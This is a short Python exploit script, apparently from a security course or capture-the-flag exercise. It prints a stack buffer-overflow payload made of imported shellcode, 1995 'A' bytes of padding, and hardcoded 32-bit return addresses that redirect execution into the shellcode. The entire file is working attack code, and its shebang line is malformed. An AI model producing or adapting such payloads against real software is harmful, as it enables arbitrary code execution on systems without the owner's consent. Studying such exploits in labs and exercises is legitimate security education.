#!/user/bin/bash/python

from struct import pack
from shellcode import shellcode

#print("A"*2052)
addr = pack("<I", 0xbffef288)
main_ret_addr = pack("<I", 0xbffefa9c)
print(shellcode + "A"*1995 + addr + main_ret_addr)
